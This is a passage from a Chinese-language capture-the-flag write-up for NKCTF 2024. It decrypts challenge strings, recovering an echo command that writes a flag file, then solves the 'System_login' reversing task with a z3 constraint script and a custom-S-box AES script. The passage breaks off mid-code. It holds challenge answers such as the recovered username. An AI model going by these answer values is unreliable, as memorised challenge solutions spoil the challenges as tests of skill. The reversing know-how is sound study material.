string">'MHtJ35fx5m9ivoQn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WlNuFPx5uX222VNnKK1unlEiItzrWt8e5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMlxF0fw1PosQyCsZaEctarlArKDMe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMlw6LxXKNp7koEMW3IPya8k71L8t7AoFcH67huo9MdqWnOIwzC4KrGje5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMrgNn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WG9DQ8GYZaDFqjle5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMBmTpbKz7XWXin6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WgVtbcB2skJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        text<span class="token operator">=</span>decrypt<span class="token punctuation">(</span>unquote<span class="token punctuation">(</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'解密数据为</span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token comment"># Password-based-encryption   This is key</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到有一条解密数据为echo U2FsdGVkX1+SslS2BbHfe3c4/t/KxLaM6ZFlOdbtfMHnG8lepnhMnde40tNOYjSvoErLzy0csL7c5d4TlMntBQ== &gt; /root/FLAG/flag.txt</p><p>U2FsdGVKX1 是对称加密头，AES之类的，然后把key填进去试一下就出了</p><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="system_login"><a class="markdownIt-Anchor" href="#system_login"></a> System_login</h2><p>密码的加密逻辑没看懂，前半段是异或，后半段感觉是AES，但是Sbox好像修改了</p><p>账号的加密逻辑很简单就是一个约束方程求解，直接z3一把梭</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#先求出username</span><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 创建一个新的Z3求解器</span>solver <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 创建16个整数变量a1[0]到a1[15]</span>a1 <span class="token operator">=</span> <span class="token punctuation">[</span>Int<span class="token punctuation">(</span><span class="token string">'a1[%d]'</span> <span class="token operator">%</span> i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment"># 添加所有的约束条件</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">447</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">101</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">12265</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2000</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">88</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">11</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">87</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">21475</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">59</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">7896</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">443</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">200</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">33774</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">556</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">333</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">44758</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">202</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">9950</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">35</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">89</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">24052</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">59</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">91</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">25209</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">111</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">654</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">123</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">222</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">113427</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">444</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">54166</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">56</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">35</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">121</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">11130</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">169</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">158</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">98</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">124</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">27382</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">147</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">131</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">129</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">23564</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">137</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">132</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">620</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">135</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">51206</span><span class="token punctuation">)</span><span class="token comment"># 检查是否存在解</span><span class="token keyword">if</span> solver<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> sat<span class="token punctuation">:</span>    model <span class="token operator">=</span> solver<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 输出解</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"a1[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">] = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>model<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No solution"</span><span class="token punctuation">)</span><span class="token comment">#输出username</span>a1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">]</span>username<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token comment">#user01_nkctf2024</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>网上找了个标准AES脚本修改了下，应该可以通杀魔改sbox的题</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># http://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf</span><span class="token keyword">class</span> <span class="token class-name">IAES</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> new_s_box    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>Nk <span class="token operator">=</span> <span class="token number">4</span>        self<span class="token punctuation">.</span>Nb <span class="token operator">=</span> <span class="token number">4</span>        self<span class="token punctuation">.</span>Nr <span class="token operator">=</span> <span class="token number">10</span>    <span class="token keyword">def</span> <span class="token function">arrays</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">)</span><span class="token punctuation">:</span>        Nb <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            Nb <span class="token operator">=</span> Nb <span class="token operator">+</span> <span class="token punctuation">[</span>raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">0</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">1</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> Nb    <span class="token keyword">def</span> <span class="token function">Inv_arrays</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">)</span><span class="token punctuation">:</span>        Inv_raws <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            Inv_raws <span class="token operator">=</span> Inv_raws <span class="token operator">+</span> <span class="token punctuation">[</span>raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">0</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">1</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> Inv_raws    <span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">)</span><span class="token punctuation">:</span>        raws <span class="token operator">=</span> self<span class="token punctuation">.</span>Inv_arrays<span class="token punctuation">(</span>raws<span class="token punctuation">)</span>        raws <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> raws<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>raws<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">view2</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'2x'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> i <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>  <span class="token comment"># i%4 == 3</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">AddRoundKey</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">,</span> Keys<span class="token punctuation">)</span><span class="token punctuation">:</span>        AddRoundKey <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> raw<span class="token punctuation">,</span> Key <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>raws<span class="token punctuation">,</span> Keys<span class="token punctuation">)</span><span class="token punctuation">:</span>            AddRoundKey<span class="token punctuation">.</span>append<span class="token punctuation">(</span>raw <span class="token operator">^</span> Key<span class="token punctuation">)</span>        <span class="token keyword">return</span> AddRoundKey    <span class="token keyword">def</span> <span class="token function">SubBytes</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">)</span><span class="token punctuation">:</span>        S_box<span class="token operator">=</span>new_s_box        raws_S_box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> raw <span class="token keyword">in</span> raws<span class="token punctuation">:</span>            raws_S_box<span class="token punctuation">.</span>append<span class="token punctuation">(</span>S_box<span class="token punctuation">[</span>raw<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> raws_S_box    <span class="token keyword">def</span> <span class="token function">InvSubBytes</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">,</span>inv_s_box<span class="token punctuation">)</span><span class="token punctuation">:</span>        IS_box <span class="token operator">=</span> inv_s_box        raws_IS_box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> raw <span class="token keyword">in</span> raws<span class="token punctuation">:</span>            raws_IS_box<span class="token punctuation">.</span>append<span class="token punctuation">(</span>IS_box<span class="token punctuation">[</span>raw<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> raws_IS_box    <span class="token keyword">def</span> <span class="token function">InvShiftRows</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">)</span><span class="token punctuation">:</span>        s13 <span class="token operator">=</span> raws<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>        raws<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> s13<span class="token punctuation">)</span>        s2223 <span class="token operator">=</span> raws<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span>        <span class="token keyword">del</span> raws<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span>        raws<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> s2223        s313233 <span class="token operator">=</span> raws<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>        <span class="token keyword">del</span> raws<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>        raws<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> s313233        <span class="token keyword">return</span> raws    <span class="token keyword">def</span> <span class="token function">GMUL</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># Russian Peasant Multiplication algorithm</span>        p <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">while</span> a <span class="token keyword">and</span> b<span class="token punctuation">:</span>            <span class="token keyword">if</span> b <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># b%2</span>                p <span class="token operator">=</span> p <span class="token operator">^</span> a            <span class="token keyword">if</span> a <span class="token operator">&amp;</span> <span class="token number">0x80</span><span class="token punctuation">:</span>  <span class="token comment"># a=a*x^7(a>0),a >= 2**7(128)</span>                a <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x11b</span>  <span class="token comment"># 0x11b = x^8 + x^4 + x^3 + x + 1 (0b100011011)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                a <span class="token operator">=</span> a <span class="token operator">&lt;&lt;</span> <span class="token number">1</span>            b <span class="token operator">=</span> b <span class="token operator">>></span> <span class="token number">1</span>        <span class="token keyword">return</span> p    <span class="token keyword">def</span> <span class="token function">InvMixColumns</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            raws<span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> \                raws<span class="token punctuation">[</span><span class="token number">1</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> \                raws<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> \                raws<span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span> \                <span class="token operator">=</span> \                self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0e</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0b</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">1</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0d</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span>                    <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x09</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">3</span> <span class="token 